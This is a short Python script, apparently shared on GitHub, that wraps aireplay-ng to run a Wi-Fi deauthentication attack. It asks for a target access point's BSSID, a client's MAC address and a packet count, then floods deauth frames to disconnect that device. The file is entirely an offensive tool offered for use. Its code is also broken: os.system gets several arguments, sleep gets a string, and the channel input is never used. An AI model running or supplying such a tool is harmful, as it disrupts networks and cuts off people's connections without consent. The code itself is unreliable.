from colorama import Fore, init
import os
from time import sleep
import subprocess
import pyfiglet
init(autoreset=True)
# Deauth Tool
# Created by: Fellcrack
# Version: 1.0          
# Date: 2023-10-01  
banner_deauth = pyfiglet.figlet_format("Deauth attack", font = "digital")
print(Fore.RED + banner_deauth)
print(Fore.WHITE +"")
deauth_interface = str(input("What interface do you wanna use? Ex: wlan0"))
os.system("ifconfig ", deauth_interface ,"down")
deauth_sub = ["xterm", "-e", "python", "Deauth_sub.py"]
subprocess.Popen(deauth_sub)
sleep("3")
deauth_bssid = str(input("Enter the BSSID what we're gonna deauth Ex: XX:XX:XX:XX:XX:XX : "))
deauth_station = str(input("Enter the station what we're gonna to deauth Ex: XX:XX:XX:XX:XX:XX : "))
deauth_channel = int(input("Enter the channel of the BSSID what we're gonna deauth Ex: 11 : "))
deauth_requests = int(input("How many request we're gonna to do for the deauth Ex: 10000000 : "))
print(Fore.RED +"The deauth attack will start in 5 seconds...")                 
sleep(5)
os.system("sudo aireplay-ng --deauth ", deauth_requests ," -a ", deauth_bssid ," -c ", deauth_station , deauth_interface)
os.system("ifconfig ", deauth_interface ,"up")
print(Fore.GREEN + "Deauth attack finished!")
print(Fore.WHITE + "You can close the terminal now.")
print(Fore.YELLOW + "Thanks for using the Deauth Tool by Fellcrack!")
print(Fore.WHITE + "If you have any questions, feel free to contact me.")
print(Fore.WHITE + "You can find me on Discord: Felly.linux")
print(Fore.WHITE + "Or on GitHub:  felly-linux")
input("Press Enter to exit...")
os.system("clear")
# End of Deauth Tool 